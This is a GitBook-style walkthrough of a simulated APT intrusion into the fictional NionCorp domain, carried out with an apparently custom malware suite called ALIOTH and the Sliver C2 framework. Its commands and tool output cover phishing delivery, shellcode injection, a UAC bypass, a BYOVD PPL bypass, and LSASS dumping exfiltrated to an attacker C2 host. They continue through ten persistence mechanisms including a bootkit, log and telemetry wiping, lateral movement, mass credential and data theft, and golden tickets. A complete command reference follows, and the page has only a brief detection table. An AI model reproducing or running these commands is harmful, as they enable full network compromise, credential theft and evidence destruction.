---
icon: buildings
cover: ../../.gitbook/assets/ChatGPT Image Aug 24, 2026, 07_19_44 AM.png
coverY: 43.278125000000024
coverHeight: 392
---

# NionCorp APT Simulation

#### Target Environment

<figure><img src="../../.gitbook/assets/ChatGPT Image Aug 24, 2026, 07_14_01 AM (1).png" alt=""><figcaption></figcaption></figure>

#### Network Topology

<figure><img src="../../.gitbook/assets/ChatGPT Image Aug 24, 2026, 07_24_19 AM.png" alt=""><figcaption></figcaption></figure>

***

#### Day 1 - Initial Access (Phishing → Charon → Sliver Beacon)

**Attacker machine setup:**

```bash
# Start Sliver C2 server
sliver-server

# Generate Sliver HTTPS beacon shellcode
sliver> generate --mtls attacker-c2.sn0xops.com --os windows --arch amd64 --format shellcode --save sliver_beacon.bin

# Start mTLS listener on 443
sliver> mtls --lport 443
```

**Build Charon artifact:**

```cmd
cd C:\ALIOTH
python modes\charon\builder\charon_builder.py --payload sliver_beacon.bin --target Chakra.dll --output artifact.c
build.bat 1024
```

**Delivery:** Spear-phishing email to `eren@nioncorp.com` subject "Q3 Budget Review", macro-enabled Excel attachment. Macro drops `ALIOTH.exe` to `%TEMP%` and executes:

```cmd
ALIOTH.exe --mode 2 --shellcode sliver_beacon.bin --target Chakra.dll --sleep-mask --fragment --env-keying
```

**What happens on WS02 (eren's machine):**

```
[+] Core engine init Umbra subsystems online
[+] Charon: scanning loaded modules...
[+] Charon: Chakra.dll found, .text section 500KB
[+] NtCreateSection + NtMapViewOfSection
[+] NtProtectVirtualMemory → RW (stack spoofed)
[+] AES-NI decrypt shellcode (environmental key match)
[+] Shellcode written to Chakra.dll .text
[+] NtProtectVirtualMemory → RX
[+] CreateTimerQueueTimer → callback execution
[+] Beacon executing inside Chakra.dll
[+] HTTPS beacon → attacker-c2.sn0xops.com:443
```

**Attacker sees:**

```bash
sliver> sessions
# ID  Name  User            Host       OS           Integrity  Last Seen
# 1   WS02  nioncorp\eren   10.0.0.50  Win11 24H2   Medium     30s ago

sliver> use 1
sliver (WS02)> getuid
# nioncorp\eren

sliver (WS02)> getprivs
# SeChangeNotifyPrivilege, SeUndockPrivilege (standard user)
```

Foothold established. eren is standard user need escalation.

***

#### Day 2 - Full Killchain (Tartarus One Command)

**Attacker tasks ALIOTH via Sliver:**

```bash
sliver (WS02)> shell
C:\Windows\Temp> ALIOTH.exe --mode 13
```

Tartarus executes 10 phases autonomously:

***

**Phase 1 - Elevate to SYSTEM:**

```
[Tartarus P1] Scanning for winlogon.exe...
[Tartarus P1] Found PID: 624 (winlogon.exe)
[Tartarus P1] NtOpenProcess(PROCESS_QUERY_LIMITED | PROCESS_DUP_HANDLE)
[Tartarus P1] OpenProcessToken → DuplicateTokenEx(TOKEN_ALL_ACCESS)
[Tartarus P1] CreateProcessAsUser(ALIOTH.exe) as SYSTEM
[Tartarus P1] SYSTEM ✅
```

***

**Phase 2 - UAC Bypass:**

```
[Tartarus P2] fodhelper registry hijack...
[Tartarus P2] HKCU\Classes\ms-settings\shell\open\command = ALIOTH.exe
[Tartarus P2] WinExec(fodhelper.exe)
[Tartarus P2] fodhelper auto-elevates → High Integrity Level ✅
```

eren sees nothing. No UAC prompt.

***

**Phase 3 - PPL Bypass (BYOVD):**

```
[Tartarus P3] Loading RTCore64.sys via SCM...
[Tartarus P3] Reading ntoskrnl.exe exports → PsInitialSystemProcess
[Tartarus P3] Walking EPROCESS linked list...
[Tartarus P3] lsass.exe EPROCESS @ 0xFFFF8A01C2340000
[Tartarus P3] Kernel write: Protection     = 0x00
[Tartarus P3] Kernel write: SignatureLevel = 0x00
[Tartarus P3] Kernel write: SectionSigLevel = 0x00
[Tartarus P3] PPL disabled ✅
```

***

**Phase 4 - LSASS Dump (Wraith):**

```
[Tartarus P4] NtCreateProcessEx → LSASS clone handle
[Tartarus P4] Reading LSASS memory via NtReadVirtualMemory...
[Tartarus P4] 14 regions read, 13.7MB raw
[Tartarus P4] ChaCha20-Poly1305 encrypt in-memory
[Tartarus P4] Split into 14 × 1MB chunks
[Tartarus P4] Exfil via HTTPS → attacker-c2.sn0xops.com ✅

Credentials extracted:
  levi     NTLM: 8846f7eaee8fb117ad06bdd830b7586c  (DevOps, local admin WS01)
  eren     NTLM: aad3b435b51404eeaad3b435b51404ee  (Standard user)
  mikassa  NTLM: 3f1f5d5e2a4ab17b9a9c4df8a5e4b321  (SQL service account)
```

No file on disk. No `dbghelp.dll` call. Dump exfilled directly.

***

**Phase 5 -  Persistence (Eos 10 mechanisms on WS02):**

```
[Tartarus P5] Installing persistence (10 mechanisms)...
  [1/10]  Registry Run            → HKCU\Run\ALIOTH ✅
  [2/10]  Scheduled Task          → logon trigger, SYSTEM ✅
  [3/10]  WMI Subscription        → Win32_LogonSession ✅
  [4/10]  DLL Sideloading         → winhttp.dll hijack ✅
  [5/10]  COM Hijacking           → CLSID TreatAs → explorer.exe ✅
  [6/10]  IFEO Debugger           → sethc.exe → cmd.exe ✅
  [7/10]  LSA Notification Pkg    → DLL loaded by LSASS on boot ✅
  [8/10]  Bootkit                 → MBR overwrite via RTCore64 ✅
  [9/10]  AppX Backdoor           → fake package auto-start ✅
  [10/10] Time Trigger            → Task Scheduler RunAt 03:00 ✅
```

10 independent survival mechanisms. Defender would need to identify and remove all 10.

***

**Phase 6 - Forensic Wipe (Acheron):**

```
[Tartarus P6] Wiping forensic trail...
  wevtutil cl Security    → 14,823 events deleted ✅
  wevtutil cl System      →  3,291 events deleted ✅
  wevtutil cl Application →  7,102 events deleted ✅
  del Prefetch\*.pf       →    247 files deleted ✅
  fsutil usn deletejournal C: → USN journal destroyed ✅
  AmsiScanBuffer → xor eax,eax; ret ✅
  EtwWrite* (16 functions) → xor eax,eax; ret ✅
  DoD 7-pass shred ALIOTH.exe → binary unrecoverable ✅
```

SIEM loses visibility from this point forward. Prefetch timeline gone. USN journal gone. AMSI and ETW telemetry dead.

***

**Phase 7 -  C2 Beacon (Nyx → Sliver):**

```
[Tartarus P7] Initializing Nyx C2...
  Channel: HTTPS (WinHTTP)
  JA3 fingerprint: randomized
  Payload encryption: ChaCha20-Poly1305
  Server: attacker-c2.sn0xops.com:443
  Sleep: 60s ± 30s jitter
  Beacon registered ✅
```

```bash
# Attacker Sliver console WS02 now running as SYSTEM
sliver> sessions
# 1  WS02  NT AUTHORITY\SYSTEM  10.0.0.50  Win11 24H2  5s
```

***

**Phase 8 - Lateral Movement (Helios 4 machines):**

**WS01 (levi) Pass-the-Hash via SMB:**

```
[Tartarus P8] PTH → WS01 using levi's hash
  SMB \\WS01\IPC$ → NTLMSSP auth with NT hash
  SVCCTL named pipe → CreateService(ALIOTH.exe --mode 13)
  Service start → SYSTEM on WS01 ✅
```

**SQL01 (mikassa) - WMI Remote Execution:**

```
[Tartarus P8] WMI → SQL01 using mikassa's hash
  Win32_Process.Create("cmd.exe /c ALIOTH.exe --mode 13")
  Execution as mikassa (SQL service context) ✅
```

**WEB01 (armin) - DCOM Lateral:**

```
[Tartarus P8] DCOM → WEB01 using armin's hash
  MMC20.Application.Document.ActiveView.ExecuteShellCommand
  ALIOTH.exe --mode 13 executing as armin ✅
```

**Domain-wide GPO Deployment:**

```
[Tartarus P8] GPO → nioncorp.local
  SYSVOL write: \\dc01\SYSVOL\nioncorp.local\Policies\{...}\User\Scripts\
  Logon script → ALIOTH.exe --mode 13
  gpupdate /force → all domain-joined machines pull policy ✅
```

**Sliver - four sessions now active:**

```bash
sliver> sessions
# 1  WS02   NT AUTHORITY\SYSTEM   10.0.0.50  Win11 24H2   5s
# 2  WS01   NT AUTHORITY\SYSTEM   10.0.0.20  Win11 24H2   8s
# 3  SQL01  NIONCORP\mikassa      10.0.0.30  WS2022       12s
# 4  WEB01  NIONCORP\armin        10.0.0.40  WS2022       15s
```

***

**Phase 9 - Data Theft (Lachesis all 4 machines):**

**armin @ WEB01:**

```
  Chrome:     147 saved passwords ✅
  Firefox:     62 saved passwords ✅
  Cookies:  2,341 session cookies (admin consoles, SaaS portals) ✅
  Files:    pentest_findings.docx, incident_response_plan.xlsx ✅
```

**levi @ WS01:**

```
  Chrome:    213 saved passwords ✅
  WiFi:      corp-wifi (WPA2-Enterprise), guest-wifi PSK ✅
  Files:     deploy_keys.txt, .env (AWS_SECRET_KEY), Dockerfile ✅
  Keylogger: 3.2MB — MSSQL sa password captured live ✅
```

**eren @ WS02:**

```
  Chrome:     89 saved passwords ✅
  Clipboard:  AWS access keys, Slack bot tokens captured live ✅
  Screenshots: 47 PNG — admin portals, source code, chat logs ✅
```

**mikassa @ SQL01:**

```
  Files:      SQL connection strings, backup configs, db exports ✅
  Screenshots: SSMS query windows, table data, stored procedures ✅
```

**Total exfiltrated:**

```
  Credentials:    511 saved passwords (4 users, Chrome + Firefox)
  Session cookies: 2,341 (admin console sessions, possibly valid)
  Documents:       2.1 GB (contracts, HR, source code, configs)
  Screenshots:     47 PNG files
  Keylogs:         3.2 MB (plain-text passwords, DB connection strings)
  Clipboard:       AWS keys, Slack tokens, DB connection strings
  WiFi profiles:   5 (corp, guest, home networks)
```

All exfilled via Nyx HTTPS channel encrypted, jittered, JA3-spoofed.

***

**Phase 10 - Decoy Display:**

```
[Tartarus P10] Displaying decoy...
  MessageBox: "Application failed to initialize (0x80070002). Please restart."
  WinExec("notepad.exe")
```

**What eren sees:**

> _A Windows error dialog appears. He clicks OK. Notepad opens. He closes it and keeps working._

10 phases complete. Entire operation took under 4 minutes. eren never knew anything happened.

***

#### Day 3 - Domain Dominance (Hermes Golden Ticket)

With SYSTEM on WS01 (levi) and access to DC01 via GPO lateral movement, attacker extracts KRBTGT hash from DC01 LSASS and forges a golden ticket:

```bash
# On DC01 session via Sliver
sliver> use 5  # DC01 session
sliver (DC01)> shell
```

```cmd
ALIOTH.exe --mode 7 --user administrator --domain nioncorp.local --golden --expiry 87600
```

```
[Hermes] Extracting KRBTGT hash from LSASS (DC01)...
[Hermes] KRBTGT NTLM: a7f2e1b3c4d5e6f7a8b9c0d1e2f3a4b5
[Hermes] Forging golden TGT:
         User:   administrator
         Domain: nioncorp.local
         SID:    S-1-5-21-...
         Expiry: 10 years (87600h)
[Hermes] LsaCallAuthenticationPackage → ticket injected ✅
```

**Silver tickets for targeted service access:**

```cmd
REM CIFS access to SQL01 — file share without domain re-auth
ALIOTH.exe --mode 7 --user mikassa --domain nioncorp.local --silver --spn cifs/sql01.nioncorp.local

REM MSSQL access as service account
ALIOTH.exe --mode 7 --user mikassa --domain nioncorp.local --silver --spn mssql/sql01.nioncorp.local
```

The golden ticket survives user password resets. Requires two consecutive KRBTGT rotations within 24 hours to invalidate most organizations never do this.

***

#### Attack Summary

<figure><img src="../../.gitbook/assets/ChatGPT Image Aug 24, 2026, 07_29_22 AM.png" alt=""><figcaption></figcaption></figure>

***

### Mode Effectiveness by Privilege Level

| Scenario                        | Functional Modes                                            |
| ------------------------------- | ----------------------------------------------------------- |
| Standard user (eren - WS02)     | 1, 2, 4, 12 (partial no WiFi/DPAPI admin keys)              |
| Local admin (levi - WS01)       | 1, 2, 3, 4, 5, 6, 8, 11, 12, 13 (partial no domain lateral) |
| Domain admin (armin WEB01/DC01) | All 13 modes fully functional                               |

**Key dependencies:**

* Modes 7, 9: Require Active Directory domain (Kerberos, lateral movement infrastructure)
* Modes 3, 5, 8, 11: Require local admin minimum (BYOVD, LSASS, persistence, anti-forensics)
* Mode 13 (Tartarus): Phases 1-7, 10 work standalone; phases 8-9 need valid credentials/domain
* Mode 10 (Nyx): Channels 1, 6, 7 require internet; channels 4, 9 are LAN-only

***

### Detection Opportunities (Blue Team Reference)

| Technique               | Detection Signal                                      | Window                          |
| ----------------------- | ----------------------------------------------------- | ------------------------------- |
| BYOVD driver load       | Unsigned driver via SCM Event ID 7045                 | During Phase 3 (if logs intact) |
| LSASS memory access     | `OpenProcess` on LSASS MDE alert                      | During Phase 4                  |
| Module stomping         | Chakra.dll with unexpected memory permissions         | During Phase 1                  |
| Pass-the-Hash           | NTLMSSP auth with same source + multiple users        | During Phase 8                  |
| Scheduled task creation | Event ID 4698 new task with SYSTEM trigger            | During Phase 5                  |
| WMI subscription        | `__FilterToConsumerBinding` Defender alert            | During Phase 5                  |
| DNS tunneling           | High-entropy subdomain queries, unusual TXT records   | During C2                       |
| HTTPS beacon            | Consistent outbound HTTPS to unknown host every \~90s | During C2                       |
| Golden ticket           | Kerberos TGT with lifetime > 10 hours                 | During Phase 9+                 |
| Event log cleared       | Security log suddenly empty Event ID 1102             | During Phase 6                  |

**Note:** ALIOTH's ETW patching and event log wipe eliminate most of these signals during and after Phase 6. Detection window is primarily before Acheron runs. SIEM must alert on log-clearing events (1102) in real-time to catch this.

***

### Quick Reference - All Commands

```cmd
REM ── BUILD ──────────────────────────────────────────────
cd C:\ALIOTH
build.bat 1024                                          REM Standard build
build.bat 2048                                          REM High entropy build

REM ── SLIVER C2 SETUP ────────────────────────────────────
sliver-server
sliver> generate --mtls c2.domain.com --os windows --arch amd64 --format shellcode --save beacon.bin
sliver> mtls --lport 443

REM ── MODES ──────────────────────────────────────────────
ALIOTH.exe --mode 1
    REM Umbra — test evasion engine on target

ALIOTH.exe --mode 2 --shellcode beacon.bin --target Chakra.dll --sleep-mask --fragment
    REM Charon — load Sliver shellcode via module stomping

ALIOTH.exe --mode 3 --memory-only --encrypt --split --exfil
    REM Wraith — dump LSASS, PPL bypass via BYOVD, memory-only

ALIOTH.exe --mode 3 --memory-only --encrypt --cred-guard
    REM Wraith — with Credential Guard bypass (LsaIso.exe)

ALIOTH.exe --mode 4 --target RuntimeBroker --payload shell.bin --technique 1
    REM Revenant — transacted hollowing into RuntimeBroker

ALIOTH.exe --mode 4 --target dllhost --payload shell.bin --technique 2
    REM Revenant — thread hijacking into dllhost

ALIOTH.exe --mode 5 --selective --memory-only --output dump.bin
    REM Mortis — quiet LSASS minidump, credential regions only

ALIOTH.exe --mode 6 --delete-after-read --direct-read --output sam_dump
    REM Shadow — VSS SAM dump, delete snapshot after read

ALIOTH.exe --mode 7 --user administrator --domain nioncorp.local --golden --expiry 87600
    REM Hermes — golden ticket, 10 year expiry

ALIOTH.exe --mode 7 --user mikassa --domain nioncorp.local --silver --spn cifs/sql01.nioncorp.local
    REM Hermes — silver ticket for CIFS access to SQL01

ALIOTH.exe --mode 7 --cross-domain --domain child.nioncorp.local
    REM Hermes — cross-domain trust exploitation

ALIOTH.exe --mode 8 --all
    REM Eos — install all 10 persistence mechanisms

ALIOTH.exe --mode 8 --remove
    REM Eos — remove all persistence (cleanup)

ALIOTH.exe --mode 9 --target WS01 --technique 1 --hash <lm:nt> --user levi
    REM Helios — Pass-the-Hash to WS01

ALIOTH.exe --mode 9 --target SQL01 --technique 2 --user mikassa --hash <ntlm>
    REM Helios — WMI execution to SQL01

ALIOTH.exe --mode 9 --technique 10 --domain nioncorp.local
    REM Helios — GPO deployment to all domain machines

ALIOTH.exe --mode 10 --server c2.domain.com --port 443 --sleep 60 --jitter 30
    REM Nyx — Sliver C2 beacon (HTTPS, JA3 spoofed, ChaCha20)

ALIOTH.exe --mode 11 --all
    REM Acheron — wipe all forensic artifacts

ALIOTH.exe --mode 11 --target C:\Users\eren\AppData\Local\Temp
    REM Acheron — DoD 7-pass shred specific directory

ALIOTH.exe --mode 12 --all --output stolen_data.zip
    REM Lachesis — steal everything, single encrypted archive

ALIOTH.exe --mode 12 --keylogger
    REM Lachesis — keylogger only

ALIOTH.exe --mode 12 --modules 1,2,3 --output creds.zip
    REM Lachesis — browser credentials only

ALIOTH.exe --mode 13
    REM Tartarus — FULL APT KILLCHAIN, one command

REM ── CHARON BUILDER ─────────────────────────────────────
python modes\charon\builder\charon_builder.py --payload beacon.bin --target Chakra.dll --output artifact.c
```

***

### File Structure

```
C:\ALIOTH\
├── ALIOTH.exe                         REM Unified binary (~500KB, 33 files compiled)
├── build.bat                          REM Build script (ML64 + MSVC x64)
├── README.md
│
├── core\                              REM Shared evasion engine (12 files)
│   ├── ALIOTH.h                       REM Master header — all types, structs, protos
│   ├── ALIOTH_config.h                REM Build-time feature toggles
│   ├── tls_context.h                  REM Per-thread TLS context structure
│   ├── engine.h / engine.c            REM Core: Halo's Gate, indirect syscalls
│   ├── syscalls_base.asm              REM MASM64: TLS init, gadget rotation, SSN XOR
│   ├── generate_stubs.py              REM 1024/2048 polymorphic stub generator
│   ├── etw_patch.c                    REM ETW patching via direct syscall
│   ├── hwbp_check.c                   REM HWBP detection and DR0-DR3 clearing
│   ├── random_mask.c                  REM 256+ dynamic XOR mask generation
│   ├── decoy_threads.c                REM 4 background decoy threads
│   ├── utils.c                        REM djb2 hash, frame calc, gadget finder
│   └── lethe_utils.h                  REM Script integration utilities
│
└── modes\                             REM 13 attack modes (21 files)
    ├── umbra\umbra_demo.c             REM Mode 1
    ├── charon\
    │   ├── charon.c                   REM Mode 2 main
    │   └── builder\charon_builder.py  REM Artifact builder
    ├── wraith\
    │   ├── wraith.c                   REM Mode 3 main
    │   ├── byovd_chain.c              REM 12 BYOVD drivers
    │   ├── driverless_read.c          REM Fallback read path
    │   └── dump_encrypt.c             REM ChaCha20 dump encryption
    ├── revenant\revenant.c            REM Mode 4
    ├── mortis\mortis.c                REM Mode 5
    ├── shadow\shadow.c                REM Mode 6
    ├── hermes\hermes.c                REM Mode 7
    ├── eos\eos.c                      REM Mode 8
    ├── helios\helios.c                REM Mode 9
    ├── nyx\nyx.c                      REM Mode 10
    ├── acheron\acheron.c              REM Mode 11
    ├── lachesis\lachesis.c            REM Mode 12
    └── tartarus\tartarus.c            REM Mode 13
```
